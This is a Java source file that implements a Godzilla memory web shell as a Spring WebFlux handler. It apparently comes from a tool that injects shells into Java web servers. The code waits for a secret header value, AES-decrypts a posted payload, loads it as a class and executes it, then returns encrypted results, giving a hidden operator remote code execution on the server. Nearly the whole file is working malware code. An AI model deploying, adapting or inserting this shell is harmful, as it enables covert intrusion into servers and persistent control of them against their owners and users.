package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class GodzillaHandlerFunction extends ClassLoader implements HandlerFunction<ServerResponse> {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public GodzillaHandlerFunction() {
    }

    protected GodzillaHandlerFunction(ClassLoader parent) {
        super(parent);
    }

    @Override
    public Mono<ServerResponse> handle(ServerRequest request) {
        String value = request.headers().firstHeader(headerName);
        if (value == null || !value.contains(headerValue)) {
            return Mono.empty();
        }
        Object bufferStream = request.formData().flatMap(map -> {
            StringBuilder result = new StringBuilder();
            try {
                byte[] data = base64Decode(map.getFirst(pass));
                data = x(data, false);
                if (payload == null) {
                    payload = new GodzillaHandlerFunction(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(request);
                    f.toString();
                    result.append(md5.substring(0, 16));
                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
                    result.append(md5.substring(16));
                }
            } catch (Throwable ex) {
                ex.printStackTrace();
                result.append(getErrorMessage(ex));
            }
            return Mono.just(result.toString());
        });
        return ServerResponse.ok().body(bufferStream, String.class);
    }


    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
